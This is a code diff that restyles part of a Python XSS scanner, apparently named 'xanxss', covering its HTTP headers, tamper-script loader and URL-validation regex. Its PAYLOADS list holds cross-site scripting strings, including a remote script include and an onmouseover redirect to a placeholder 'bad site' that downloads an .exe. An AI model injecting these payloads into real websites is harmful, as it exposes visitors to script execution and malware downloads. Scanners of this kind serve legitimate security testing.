@@ -11,28 +11,31 @@ HEADERS = {
     "Connection": "close",
     "User-Agent": "xanxss/v{} (Language={}; Platform={})".format(
         VERSION, sys.version.split(" ")[0], platform.platform().split(" ")[0]
-    )
+    ),
 }
 PAYLOADS = [
     "<script src='http://xss.rocks/xss.js'></script>",
     "<img src='javascript:alert(\"XSS\");'>",
     "<script>alert(1);</script>",
-    "<b onmouseover=window.location='https://mybadsite.com/download.php?item=pumpedupkicks.exe'>click me!</b>",
+    (
+        "<b onmouseover=window.location='https://mybadsite.com/download.php?item=pumpedupkicks.exe'>click"
+        " me!</b>"
+    ),
     '<iframe src="javascript:prompt(1)">',
-    "<xanxss></xanxss>"
+    "<xanxss></xanxss>",
 ]
 
 
 def load_tampers():
-    """
-    load the tamper scripts into memory
-    """
+    """Load the tamper scripts into memory."""
     script_path = "{}/tamper".format(os.getcwd())
     importter = "tamper.{}"
     skip_schema = ("__init__.py", ".pyc", "__")
     tmp = []
     retval = []
-    file_list = [f for f in os.listdir(script_path) if not any(s in f for s in skip_schema)]
+    file_list = [
+        f for f in os.listdir(script_path) if not any(s in f for s in skip_schema)
+    ]
     for script in file_list:
         script = script[:-3]
         script = importlib.import_module(importter.format(script))
@@ -49,9 +52,7 @@ def load_tampers():
 
 
 def prettify(working):
-    """
-    make output beautiful
-    """
+    """Make output beautiful."""
     seperator = "-" * 50
     print(seperator)
     for item in working:
@@ -62,12 +63,13 @@ def prettify(working):
 def heuristics(url):
     query_regex = re.compile(r"(.*)[?|#](.*){1}\=(.*)")
     url_validation = re.compile(
-        r'^(?:http|ftp)s?://'  # http:// or https://
-        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|'  # domain...
-        r'localhost|'  # localhost...
-        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'  # ...or ip
-        r'(?::\d+)?'  # optional port
-        r'(?:/?|[/?]\S+)$', re.IGNORECASE
+        r"^(?:http|ftp)s?://"  # http:// or https://
+        r"(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|"  # domain...
+        r"localhost|"  # localhost...
+        r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})"  # ...or ip
+        r"(?::\d+)?"  # optional port
+        r"(?:/?|[/?]\S+)$",
+        re.IGNORECASE,
     )
     retval = {}
     if url_validation.match(url):
